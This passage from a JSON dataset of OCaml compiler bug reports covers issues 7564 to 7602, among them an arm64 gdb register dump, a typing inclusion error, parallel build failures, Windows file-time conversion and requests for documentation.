<+12>:\tadd\tx0, x0, #0x2d8\r\n   0x0000ffff8954d0e0 <+16>:\tadrp\tx16, 0xffff8954d000 <__do_global_dtors_aux+24>\r\n=> 0x0000ffff8954d0e4 <+20>:\tstr\tx0, [x16, #576]\r\n   0x0000ffff8954d0e8 <+24>:\tadrp\tx1, 0xffff8956c000\r\n   0x0000ffff8954d0ec <+28>:\tadd\tx1, x1, #0x2c0\r\n   0x0000ffff8954d0f0 <+32>:\tadrp\tx16, 0xffff8954d000 <__do_global_dtors_aux+24>\r\n\r\n(gdb) info registers \r\nx0             0xffff8956c2d8\t281472985907928\r\nx1             0xfffffe0ca418\t281474943984664\r\nx2             0x19958c20\t429231136\r\nx3             0x198fb010\t428847120\r\nx4             0x1\t1\r\nx5             0x0\t0\r\nx6             0x0\t0\r\nx7             0xffff90c144a1\t281473110328481\r\nx8             0xfffffe0ca520\t281474943984928\r\nx9             0x4bfe9c\t4980380\r\nx10            0x0\t0\r\nx11            0x19958128\t429228328\r\nx12            0xffff8954c2c0\t281472985776832\r\nx13            0x0\t0\r\nx14            0x17\t23\r\nx15            0xffff8954d0d0\t281472985780432\r\nx16            0xffff8954d000\t281472985780224\r\nx17            0x559000\t5607424\r\nx18            0x0\t0\r\nx19            0x199581b0\t429228464\r\nx20            0xffff89be2468\t281472992683112\r\nx21            0x557000\t5599232\r\nx22            0x0\t0\r\nx23            0xffff8954d1e0\t281472985780704\r\nx24            0xffff8954d038\t281472985780280\r\nx25            0xffff89be2ab8\t281472992684728\r\nx26            0xfffffe0ca2e0\t281474943984352\r\nx27            0xffff89be1fd0\t281472992681936\r\nx28            0xffff899f2000\t281472990650368\r\nx29            0xfffffe0ca310\t281474943984400\r\nx30            0x4bfe3c\t4980284\r\nsp             0xfffffe0ca2c0\t0xfffffe0ca2c0\r\npc             0xffff8954d0e4\t0xffff8954d0e4 <camlPlugin__entry+20>\r\ncpsr           0x80000000\t[ EL=0 N ]\r\nfpsr           0x0\t0\r\nfpcr           0x0\t0\r\n\r\n## Steps to reproduce\r\n\r\nCompile ocaml and run the test suite from the build directory in the normal way.\r\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7601\r\n**Reporter:** mandrykin\r\n**Assigned to:** @garrigue\r\n**Status:** resolved (set by @garrigue on 2017-09-12T23:35:43Z)\r\n**Resolution:** fixed\r\n**Priority:** low\r\n**Severity:** minor\r\n**Platform:** x86_64\r\n**OS:** Linux 4.4.0\r\n**OS Version:** Ubuntu 16.04.2\r\n**Version:** 4.05.0\r\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\r\n**Category:** typing\r\n\r\n## Bug description\r\n\r\nThe following fragment:\r\n\r\n```ocaml\r\nmodule type Analysis = sig\r\n  type t\r\n  type 'a maybe_region =\r\n    [< `Location of t\r\n    |  `Value of t\r\n    |  `None ] as 'a\r\n  val of_var : ?f:string -> string -> [ `Location of _ | `Value of _  | `None ] maybe_region\r\nend\r\n\r\nmodule Make (Analysis : Analysis) = struct\r\n  include Analysis\r\n  let of_var = of_var ~f:\"\"\r\nend\r\n```\r\n\r\nproduces the following inclusion error:\r\n\r\n```\r\nAt position module Make(Analysis) : <here>                                                                                                 Values do not match:                                                                                                                \r\n         val of_var : string -> [ `Location of t | `None | `Value of t ]\r\n       is not included in\r\n         val of_var : string -> [ `Location of t | `None | `Value of t ]\r\n```\r\n\r\n(no observable difference in types and no visible type variables) (in 4.05.0)\r\n\r\nHowever, if either generalization is requested for the value `of_var' using eta-expansion or a type annotation that does *not* involve the type maybe_region is added, the error disappears. So either of the following works:\r\n\r\n```ocaml\r\nmodule Make (Analysis : Analysis) = struct\r\n  include Analysis\r\n  let of_var x = of_var ~f:\"\" x\r\nend\r\n```\r\n\r\nor\r\n\r\n```ocaml\r\nmodule Make (Analysis : Analysis) = struct\r\n  include Analysis\r\n  let of_var : _ -> [ `Location of _ | `None | `Value of _] = of_var ~f:\"\" \r\nend\r\n```\r\n\r\nbut not \r\n\r\n```ocaml\r\nmodule Make (Analysis : Analysis) = struct\r\n  include Analysis\r\n  let of_var : _ -> [ `Location of _ | `None | `Value of _] maybe_region  = of_var ~f:\"\" \r\nend\r\n```\r\n\r\n## Additional information\r\n\r\nThe types like ``[`A of _ | `B of _ | `C] t where 'a t = 'a constraint 'a = [`A of t1 | `B of t2 | `C of t3 | `D of ... | .... | `X of tn]`` are convenient for avoiding repeating the types of the polymorphic constructors if they are taken from some pre-defined set e.g. using\r\n``[`Location of _ | `None] maybe_region`` instead of\r\n``[`Location of U.t * [`None | `Value of U.t] | `None]``.\r\n\r\n## File attachments\r\n\r\n- [example.ml](https://gist.githubusercontent.com/vicuna/efa078baf068b4b37a1991b4e3ea73c1/raw/58e0eed366cf7a1c864745be3e0f74249b3fa892/example.ml)\r\n- [slice.ml](https://gist.githubusercontent.com/vicuna/efa078baf068b4b37a1991b4e3ea73c1/raw/7dd1db7d53421bc06149ee92fc26551e3a88c8ea/slice.ml)\r\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7600\n**Reporter:** @gasche\n**Status:** acknowledged (set by @xavierleroy on 2017-09-30T09:06:22Z)\n**Resolution:** open\n**Priority:** low\n**Severity:** text\n**Version:** 4.06.0 +dev/beta1/beta2/rc1\n**Target version:** later\n**Category:** documentation\n**Related to:** #7599\n\n## Bug description\n\nThere is documentation about the bootstrap process in two places:\r\n\r\n- in INSTALL.adoc#bootstrap, there are accessible explanations on what a bootstrap from a working compiler does\r\n- in Makefile, the \"hard bootstrap how-to\" explains how to do bootstrap across changes that break stuff (and thus require a bootstrap)\r\n\r\nTo my knowledge there is no public description of when to bootstrap, and of the commit process around a bootstrap. (I believe both changed in the last couple years, with the primitive stuff requiring less bootstraps and the consensus to separate bootstrap commits from the rest.)\n\n## Additional information\n\nThis is related to #7599 (documentation for magic number updates) given that documenting the commit process around magic numbers requires being able to explain the bootstrap part.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7599\n**Reporter:** @gasche\n**Status:** acknowledged (set by @xavierleroy on 2017-09-21T08:32:40Z)\n**Resolution:** open\n**Priority:** low\n**Severity:** text\n**Target version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** documentation\n**Tags:** junior_job\n**Related to:** #7598 #7600\n\n## Bug description\n\nCurrently external contributors may not know about magic numbers, when to update them, and what is the process to update them (in particular, I believe that a bootstrap is needed?).\r\n\r\nThis could be explained in comments in utils/config.mlp (I like having documentation close to the code) or maybe in utils/HACKING.adoc.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7598\n**Reporter:** bartjacobs\n**Assigned to:** @damiendoligez\n**Status:** resolved (set by @xavierleroy on 2017-10-19T13:24:18Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** crash\n**Platform:** x64\n**OS:** macos\n**OS Version:** 10.11.6\n**Version:** 4.05.0\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** lexing and parsing\n**Related to:** #7599\n**Monitored by:** @gasche\n\n## Bug description\n\nSuggested fix: add code to detect incompatibility and produce helpful error message.\n\n## Steps to reproduce\n\nInstall version 4.05 of OCaml and 4.04+1 of camlp4. Create file foo.ml containing the text\r\n\r\ntype bar = < quux: unit >\r\n\r\nRun\r\n\r\nocamlopt.opt -c -pp camlp4o.opt foo.ml\r\n\r\nThis creates a segfault. See the OS X crash report attached.\n\n## File attachments\n\n- [ocamlopt.opt_2017-07-25-134408_Bart-Jacobss-MacBook-Pro.crash](https://gist.githubusercontent.com/vicuna/f9b50c661fd28b8c7b43a3fac3c479eb/raw/98f8c4699bbfe7d55dd67a5a98c1fa4c57d3ebbb/ocamlopt.opt_2017-07-25-134408_Bart-Jacobss-MacBook-Pro.crash)\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7596\n**Reporter:** theindigamer\n**Assigned to:** @Octachron\n**Status:** assigned (set by @Octachron on 2017-07-22T13:20:48Z)\n**Resolution:** open\n**Priority:** low\n**Severity:** minor\n**Platform:** Linux\n**OS:** Ubuntu\n**OS Version:** 16.04\n**Version:** 4.04.0\n**Category:** ocamldoc\n**Monitored by:** @gasche\n\n## Bug description\n\nOcamldoc seems to generate misleading constructor tags for modules. While I've seen this locally, the simplest way to \"reproduce\" this is to inspect the source for the Pervasives documentation:\r\n\r\nhttp://caml.inria.fr/pub/docs/manual-ocaml/libref/Pervasives.html\r\n\r\nFor example, on inspecting the source for the line \"More string operations are provided in module String.\" in the section String operations (line 767 as seen on 2017/07/22):\r\n\r\nMore string operations are provided in module <a href=\"String.html\"><code class=\"code\"><span class=\"constructor\">String</span></code></a>.<br>\r\n\r\nI don't think the constructor tag should be there in the first place -- as it mixes modules and value constructors under the same tag.\r\n\r\n(Sorry if this has been reported before/solved already, I checked the bug tracker once and I couldn't find anything discussing this point.)\r\n\r\nUnrelated: it seems the CSS is wonky for the Parameters table here -- http://caml.inria.fr/pub/docs/manual-ocaml/libref/Set.Make.html -- from what I understand, the `<code>` tag inside the table (for the first entry) causes the text to shrink and the `valign` attribute causes it to hit the cell ceiling. As far as I can tell, this can be fixed by re-asserting `font-size : blah` inside tables for the CSS.\r\n\r\n(Tested on Firefox 54.0)\n\n## Steps to reproduce\n\nSee description.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7595\n**Reporter:** olh\n**Status:** resolved (set by @xavierleroy on 2017-10-24T07:54:18Z)\n**Resolution:** unable to duplicate\n**Priority:** normal\n**Severity:** minor\n**Platform:** Linux\n**OS:** Tumbleweed\n**OS Version:** rolling\n**Version:** 4.03.0\n**Category:** runtime system and C interface\n**Monitored by:** @gasche\n\n## Bug description\n\nAs a followup to a discussion on the caml-list@inria.fr on 2017-05-31 I was asked to enter this feature request:\r\n\r\nopenSUSE Tumbleweed switched to gcc7, with the result that most ocaml related packages fail to build. The reason is that libasmrun.a instead of libasmrun_pic.a is used during linking:\r\n\r\n\r\nocamlfind ocamlopt unix.cmxa -I /usr/lib64/ocaml/ocamlbuild /usr/lib64/ocaml/ocamlbuild/ocamlbuildlib.cmxa -linkpkg myocamlbuild.ml /usr/lib64/ocaml/ocamlbuild/ocamlbuild.cmx -o myocamlbuild\r\n\r\n/usr/lib64/gcc/x86_64-suse-linux/7/../../../../x86_64-suse-linux/bin/ld: /usr/lib64/ocaml/libasmrun.a(startup_aux.o): relocation R_X86_64_32 against `.rodata.str1.1' can not be used when making a shared object; recompile with -fPIC\r\n\r\nPer the discussion there is apparently a knob 'runtime_variant(_pic)' for ocamlbuild. To my understanding this would need to be done for each package.\r\n\r\nThe workaround is to replace %{_libdir}/ocaml/libasmrun.a with libasmrun_pic.a to have this system-wide fixed.\r\n\r\nIt would be nice if there is a configure option to automatically select the \"_pic\" variant, unless otherwise specified by the project/package.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7594\n**Reporter:** @yallop\n**Assigned to:** @yallop\n**Status:** resolved (set by @yallop on 2017-08-03T13:27:57Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** runtime system and C interface\n**Monitored by:** @gasche @dbuenzli\n\n## Bug description\n\nSince GPR 687 (https://github.com/ocaml/ocaml/pull/687) it's possible to enable -safe-string globally at configure time.\r\n\r\nThere's a second GPR open (https://github.com/ocaml/ocaml/pull/1252) that makes configuration-time -safe-string the default.\r\n\r\nAt present, -safe-string only affects OCaml code; C stubs that mutate OCaml strings will continue to compile without error.  This may lead to subtle bugs, not least since the compiler now takes string immutability into account during optimizations (https://github.com/ocaml/ocaml/pull/703).\r\n\r\nShould we update String_val to return 'const char *' when -safe-string is enabled, like this?\r\n\r\n   #ifdef CAML_SAFE_STRING\r\n   #define String_val(x) ((const char *) Bp_val(x))\r\n   #else\r\n   #define String_val(x) ((char *) Bp_val(x))\r\n   #endif\r\n\r\nWe'd also need a new 'Bytes_val' that always returned 'char *'.\r\n\r\nThis change would be slightly backwards-incompatible, but probably not any more so than defaulting to -safe-string.  And it seems likely to improve the quality of code, by making it more explicit which C code can actually modify OCaml string/bytes values.\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7593\r\n**Reporter:** @elfring\r\n**Status:** closed (set by @xavierleroy on 2017-07-21T15:26:11Z)\r\n**Resolution:** not a bug\r\n**Priority:** low\r\n**Severity:** trivial\r\n**Version:** 4.03.0\r\n**Category:** tools (ocaml{lex,yacc,dep,debug,...})\r\n\r\n## Bug description\r\n\r\nI wonder why dependencies are incompletely exported for module interface source files.\r\n\r\n## Steps to reproduce\r\n\r\nI have tried the following command out.\r\n```\r\nelfring@Sonne:~/Projekte/OCaml/OCamlbuild/lokal> ocamldep -all -one-line src/*.ml* > ../dep-all1.txt\r\n```\r\n## Additional information\r\n\r\nDevelopment status of the dependency generator for OCaml\r\nhttps://sympa.inria.fr/sympa/arc/caml-list/2017-07/msg00087.html\r\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7591\n**Reporter:** voglerr\n**Status:** resolved (set by @xavierleroy on 2017-09-21T11:49:37Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**OS:** macOS\n**OS Version:** 10.13 Beta\n**Version:** 4.05.0\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** platform support (windows, cross-compilation, etc)\n**Related to:** #7887\n**Monitored by:** voglerr @gasche @dbuenzli\n\n## Bug description\n\nSince the latest macOS update (probably because of the Xcode update) I get linker warnings with ocamlopt.\r\n\r\n~~~\r\n? ocamlopt test.ml\r\nld: warning: pointer not aligned at address 0x100024754 (_caml_startup__frametable + 8 from /var/folders/0j/1lq15k654zg7cf1rh9_gqty80000gn/T/camlstartup9725f2.o)\r\nld: warning: pointer not aligned at address 0x10002484C (_camlStd_exit__frametable + 8 from /Users/voglerr/.opam/4.05.0/lib/ocaml/std_exit.o)\r\nld: warning: pointer not aligned at address 0x1000248D4 (_camlTest__frametable + 8 from test.o)\r\nld: warning: pointer not aligned at address 0x100024994 (_camlCamlinternalFormatBasics__frametable + 8 from /Users/voglerr/.opam/4.05.0/lib/ocaml/stdlib.a(camlinternalFormatBasics.o))\r\nld: warning: pointer not aligned at address 0x1000266EC (_camlPervasives__frametable + 8 from /Users/voglerr/.opam/4.05.0/lib/ocaml/stdlib.a(pervasives.o))\r\n~~~\r\n\r\nocaml 4.05.0, 4.04.1\r\nXcode Version 9.0 beta 2 (9M137d)\r\nApple LLVM version 9.0.0 (clang-900.0.26)\r\nmacOS 10.13 Beta (17A306f)\n\n## File attachments\n\n- [test.ml](https://gist.githubusercontent.com/vicuna/8fcdbeaab54eaf41726c7518b80e853f/raw/55b9f459b8b7d4a5ba18dfe86c918ebb7b76fb5c/test.ml)\n- [test.s](https://gist.githubusercontent.com/vicuna/8fcdbeaab54eaf41726c7518b80e853f/raw/d3c0843f8ca6cf9e52ac5b6bae1b71eccaef824e/test.s)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7588\n**Reporter:** zozozo\n**Assigned to:** @Octachron\n**Status:** resolved (set by @Octachron on 2017-08-22T08:27:55Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** trivial\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** documentation\n**Monitored by:** @gasche\n\n## Bug description\n\nMentionning the existence of the Format.pp_{set,get}_formatter_out_functions in the paragraph/section talking about the formatter_out_functions, or at least mentioning it is possible to change these functions on a specific formatter and not only the standard one would greatly increase their visibility and usability.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7587\n**Reporter:** Richard Jones\n**Assigned to:** @shindere\n**Status:** resolved (set by @xavierleroy on 2017-09-21T15:15:04Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Platform:** x86_64\n**OS:** Linux\n**OS Version:** Fedora 27\n**Version:** 4.05.0\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** configure and build/install\n**Monitored by:** @gasche\n\n## Bug description\n\nParallel builds (make -j 16) are broken in the lex/ subdirectory.  See the attached build log.\n\n## Steps to reproduce\n\nmake -j 16 world.opt\n\n## Additional information\n\nThis working (perhaps by luck) in OCaml 4.04.x.\n\n## File attachments\n\n- [build-4.05.0-1.fc27.log](https://gist.githubusercontent.com/vicuna/16b5f4cc8d3b7869707ff6a059e097a3/raw/9c202418834646a3fff80c69a2cf8846230a204a/build-4.05.0-1.fc27.log)\n"},{"labels":[null,"bug",null,null],"text":"**Original bug ID:** 7585\n**Reporter:** xnox\n**Assigned to:** @mshinwell\n**Status:** resolved (set by @mshinwell on 2017-08-07T15:31:32Z)\n**Resolution:** duplicate\n**Priority:** high\n**Severity:** block\n**Platform:** arm64\n**OS:** Ubuntu\n**OS Version:** 17.10/devel\n**Version:** 4.05.0\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** back end (clambda to assembly)\n**Has duplicate:** #7602\n**Monitored by:** @gasche @glondu \"Richard Jones\"\n\n## Bug description\n\nOCaml 4.04, 4.05-rc1 incompatible with snapshot binutils, when built with -fPIC, results in crashes\r\n\r\nWhen configuring and building ocaml with -fPIC option to configure, it is miscompiled and results in test-suite crashes, and subsequent miscompilation of other ocaml packages.\r\n\r\nThis is on arm64 only.\r\n\r\nSee attached buildlog\n\n## Steps to reproduce\n\n* Use a recent snapshot of binutils trunk, e.g. 2.28.90.20170704-0ubuntu1\r\n* Use a recent snapshot of ocaml, e.g. 4.05-rc1\r\n* Use arm64 platform\r\n* Run configure with -fPIC option\r\n* Observe reloaction errors in the build log\r\n* Observe failing test suite\n\n## Additional information\n\nbinutils on arm64 has been improved to be more strict with PIC code, which may be resulting in these errors / bugs. Please see the below mailing list thread.\r\n\r\n\r\nhttps://sourceware.org/ml/binutils/2017-06/msg00226.html\n\n## File attachments\n\n- [arm64-ocaml-pic-option-1.patch](https://gist.githubusercontent.com/vicuna/36623ef607c11617b91822042fe29102/raw/1b8fe51c62e9a2906c787c10d0c65bac77d9c5c2/arm64-ocaml-pic-option-1.patch)\n- [arm64_ocaml_pic_straw-man-1.patch](https://gist.githubusercontent.com/vicuna/36623ef607c11617b91822042fe29102/raw/d463dfcf8902c58b3ea0ff28b7fec9bd59fb3443/arm64_ocaml_pic_straw-man-1.patch)\n- [arm64_ocaml_pic_straw-man-2.patch](https://gist.githubusercontent.com/vicuna/36623ef607c11617b91822042fe29102/raw/4b86634ab7f2c0f4ff4245a382d870b74295f3a4/arm64_ocaml_pic_straw-man-2.patch)\n- [ocaml_4.05.0~rc1-1_arm64.build.txt.xz](https://gist.githubusercontent.com/vicuna/36623ef607c11617b91822042fe29102/raw/b5178f58d9a6fbc24f1b80e3f0f257ec12503e91/ocaml_4.05.0~rc1-1_arm64.build.txt.xz)\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7584\n**Reporter:** @gasche\n**Status:** acknowledged (set by @gasche on 2017-07-12T19:07:31Z)\n**Resolution:** open\n**Priority:** low\n**Severity:** text\n**Target version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** documentation\n**Tags:** junior_job\n\n## Bug description\n\nThe \"overview of the compiler\" sections of the ocamlc and ocamlopt sections of the manual give a summary of the role of various file extensions consumed or produced by the ocaml compilers\r\n\r\n  http://caml.inria.fr/pub/docs/manual-ocaml/comp.html#sec265\r\n  http://caml.inria.fr/pub/docs/manual-ocaml/native.html#sec286\r\n\r\nUnfortunately, they were never updated to describe .cmt* files, so users that look at the build artifacts of a project may not know what those are.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7581\n**Reporter:** @nojb\n**Status:** acknowledged (set by @xavierleroy on 2017-07-12T17:07:22Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Target version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** runtime system and C interface\n**Monitored by:** @ygrek @oandrieu\n\n## Bug description\n\nThe msvc compiler allows variable declarations only after opening braces.  As such the CAMLlocalN macro does not errors out.\r\n\r\nIs there some C macro wizardy that would make this work ?\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7580\n**Reporter:** bobot\n**Assigned to:** @dra27\n**Status:** resolved (set by @dra27 on 2017-07-06T13:01:19Z)\n**Resolution:** not a bug\n**Priority:** high\n**Severity:** major\n**Version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** typing\n\n## Bug description\n\nThe warning for deprecation seems to be inherited when functions are defined as alias:\r\n\r\n\r\n```\r\n  include struct\r\n    [@@@warning \"-3\"]\r\n    let capitalize_ascii   = String.capitalize\r\n    let uncapitalize_ascii = String.uncapitalize\r\n    let uppercase_ascii    = String.uppercase\r\n    let lowercase_ascii    = String.lowercase\r\n  end\r\n```\r\n\r\nJbuilder use this code for being compatible with different ocaml version, it works for older versions, but with 4.05, user of this module raise the warning 3.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7579\n**Reporter:** berenger\n**Status:** resolved (set by @xavierleroy on 2017-07-04T07:15:36Z)\n**Resolution:** not fixable\n**Priority:** normal\n**Severity:** text\n**Platform:** all\n**OS:** all\n**OS Version:** all\n**Category:** standard library\n\n## Bug description\n\nHello,\r\nIt would be nice if the ocamldoc says something about the resolution\r\nof the timer being used.\r\nCurrently, I don't know if milliseconds are OK. What about micro seconds?\r\nThe danger is that users ask to wait a very small value that is below\r\nthe timer's resolution.\r\nAnd, quite nastily, they would always wait much more than what they asked for.\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7578\n**Reporter:** Richard-Degenne\n**Assigned to:** @Octachron\n**Status:** resolved (set by @Octachron on 2017-07-03T14:23:48Z)\n**Resolution:** duplicate\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.04.2\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** standard library\n**Duplicate of:** #7523\n\n## Bug description\n\nWhen using the `Arg` module, a missing argument will trigger an error.\r\n\r\nHowever, the error message is printed 3 times in a row instead of only once.\r\n\r\n*Note* : I tried the same piece of code with 4.03.0 and 4.02.3, and was unable to reproduce.\n\n## Steps to reproduce\n\nWith OCaml 4.04.2,\r\n\r\n- Create a file `cli.ml` containing the following:\r\n\r\n\r\n```\r\n(* cli.ml *)\r\n\r\nlet usage = \"usage: \" ^ Sys.argv.(0) ^ \" [-d int]\"\r\n\r\nlet speclist = [\r\n  (\"-d\", Arg.Set_int someint, \": some int parameter\");\r\n]\r\n\r\nlet () =\r\n  Arg.parse\r\n    speclist\r\n    (fun x -> raise (Arg.Bad (\"Bad argument : \" ^ x)))\r\n    usage;\r\n  Printf.printf \"%d\\n\" !someint\r\n```\r\n\r\n- Run with `$ ocaml cli.ml -d` (note the missing argument after -d)\r\n\r\n- Look at the error message:\r\n\r\n```\r\ncli.ml: option '-d' needs an argument.\r\nusage: cli.ml [-d int]\r\n  -d : some int parameter\r\n  -help  Display this list of options\r\n  --help  Display this list of options\r\ncli.ml: cli.ml: option '-d' needs an argument.\r\nusage: cli.ml [-d int]\r\n  -d : some int parameter\r\n  -help  Display this list of options\r\n  --help  Display this list of options\r\n.\r\nusage: cli.ml [-d int]\r\n  -d : some int parameter\r\n  -help  Display this list of options\r\n  --help  Display this list of options\r\n```g\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7572\r\n**Reporter:** @sliquister\r\n**Status:** acknowledged (set by @xavierleroy on 2017-07-18T20:19:38Z)\r\n**Resolution:** open\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Version:** 4.04.2\r\n**Category:** runtime system and C interface\r\n**Monitored by:** @gasche @hcarty @dbuenzli\r\n\r\n## Bug description\r\n\r\nWhen writing ocaml plugins for C programs, you end with\r\nfunctions that look like this:\r\n\r\n```C\r\nvoid called_from_the_C_program (char* str) {\r\n  caml_acquire_lock();\r\n  {\r\n    CAMLparam0();\r\n    CAMLlocal1(v, res);\r\n    v = caml_copy_string(str);\r\n    caml_callback(.., v);\r\n    CAMLdrop;\r\n  }\r\n  caml_release_lock();\r\n}\r\n```\r\n\r\nThe problem is that this function is most likely broken, because if\r\nthe caml function raises, the ocaml runtime will either exit or unwind\r\nthe stack past the C program.\r\nWe have caml_callback_exn to help with this, but it's not enough\r\nbecause caml_alloc_string can also raise.\r\n\r\nThere seems to be no way of catching ocaml exceptions from a block of\r\nC code, short of exporting the C code, writing an ocaml function that\r\ncalls it, registering the ocaml function and calling it from C, which\r\nis a bit ridiculous.\r\n\r\nThere's this caml_alloc_shr_no_raise function, which may be usable\r\nfor this purpose but it's undocumented, so I am not sure it's meant\r\nto be used from the outside (and it's probably not very nice to\r\nhave to duplicate all the allocation functions with a _no_raise\r\nsuffix).\r\n\r\nSo is there a recommended way to not throw ocaml exceptions in C\r\nbindings? If not, can we create one?\r\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7571\n**Reporter:** nbb\n**Status:** resolved (set by @xavierleroy on 2017-06-27T14:01:17Z)\n**Resolution:** unable to duplicate\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.04.0\n**Category:** toplevel\n\n## Bug description\n\nthe #use directive is described as \r\n\r\n#use <str>\r\n  Read, compile and execute source phrases from the given file.\r\n\r\nbut when i change the .ml and #use it while still an old corresponding .cmo is available to the toplevel this old file seems to be used.\n\n## Steps to reproduce\n\nmake a source file a.ml. \r\ncompile to bytecode a.cmo either in current directory or in _build directory as done by ocamlbuild. \r\nedit and change a.ml.\r\nopen utop, if necessary add _build as #directory.\r\nin utop, #use \"a.ml\";;\r\nthe old version will be loaded\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7570\n**Reporter:** @Octachron\n**Status:** resolved (set by @xavierleroy on 2017-09-30T09:05:15Z)\n**Resolution:** fixed\n**Priority:** low\n**Severity:** minor\n**Version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** compiler driver\n**Monitored by:** @gasche\n\n## Bug description\n\nSince OCaml 4.03 and #6108, the dynlink library cannot be used inside the toplevel. However, like \"ocamlc\" and \"ocamlopt\", the toplevel \"ocaml\" provides a \"-plugin\" option. Trying to use this option yields a toplevel fatal error due to the uncatched exception:\r\n \r\n\"Invalid_argument(\"The dynlink.cma library cannot be used inside the OCaml toplevel\")\".\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7569\n**Reporter:** markghayden\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2017-06-27T02:01:00Z)\n**Resolution:** duplicate\n**Priority:** normal\n**Severity:** minor\n**Platform:** AMD64\n**OS:** MacOS\n**OS Version:** 10.12.2\n**Version:** 4.04.0\n**Fixed in version:** 4.04.2\n**Category:** otherlibs\n**Duplicate of:** #7385\n\n## Bug description\n\nstat.c in otherlibs/win32unix has the following code for converting file times:\r\n\r\n    if (!FileTimeToLocalFileTime(time, &local) ||\r\n        !FileTimeToSystemTime(&local, &sys))\r\n\r\nThe MSDN docs (https://msdn.microsoft.com/en-us/library/windows/desktop/ms724277%28v=vs.85%29.aspx?f=255&MSPPError=-2147217396) say the following:\r\n\r\n\r\nRemarks\r\n\r\nTo account for daylight saving time when converting a file time to a local time, use the following sequence of functions in place of using FileTimeToLocalFileTime:\r\nFileTimeToSystemTime\r\nSystemTimeToTzSpecificLocalTime\r\nSystemTimeToFileTime\n\n## Steps to reproduce\n\n0) Get current time with Unix.gettimeofday\r\n1) Create a file\r\n2) Call Unix.stat\r\n3) Compare stat.st_mtime with the gettimeofday\r\n\r\nSee attached test file.\n\n## Additional information\n\nOutput on MacOS is correct:\r\n\r\ntime0 =1498527385.21647906\r\ntime0a=1498527385.00000000 (-0.21647906)\r\ntime1 =1498527385.00000000 (-0.21647906)\r\ntime2 =1498527385.21670294 (+0.00022388)\r\n\r\nOutput on Windows is incorrect:\r\n\r\ntime0 =1498528190.84126230\r\ntime0a=1498528190.00000000 (-0.84126234)\r\ntime1 =1498513790.00000000 (-14400.84126234)   <<<<<<<<<<<<<<<<<<<<\r\ntime2 =1498528190.84126230 (+0.00000000)\n\n## File attachments\n\n- [stat_error.ml](https://gist.githubusercontent.com/vicuna/7ef1975d2d43259fb06fdc665fe12dc1/raw/3036a333a9abbbda1c08871b0186dda7d36a2d50/stat_error.ml)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7567\n**Reporter:** Richard Jones\n**Assigned to:** @Octachron\n**Status:** resolved (set by @Octachron on 2017-06-26T12:31:19Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Platform:** Linux x86_64\n**OS:** Fedora\n**OS Version:** 27\n**Version:** 4.04.2\n**Category:** standard library\n**Monitored by:** @gasche \"Richard Jones\"\n\n## Bug description\n\nThis happens with both OCaml 4.04.2 and with OCaml 4.06 from git.  Simply run the test suite, and it fails at:\r\n\r\n ... testing 'sorts.ml': ocamlc  Error: results don't match reference output!\r\n\r\nThis works on Fedora 26, but fails on Fedora 27.  The major difference could be updated glibc.  I'm not sure what else would affect this test.\r\n\r\nFedora 26 (working):\r\nglibc-2.25-6.fc26.x86_64\r\n\r\nFedora 27 (failing):\r\nglibc-2.25.90-12.fc27.x86_64\n\n## Steps to reproduce\n\nmake -j1 tests\n\n## Additional information\n\nThe full output of the test is attached.\n\n## File attachments\n\n- [log](https://gist.githubusercontent.com/vicuna/366f28f254804e8741411e216129a826/raw/f4a663a91441d2428ece75c75d116bd8e6a0b174/log)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7564\n**Reporter:** @nojb\n**Assigned to:** 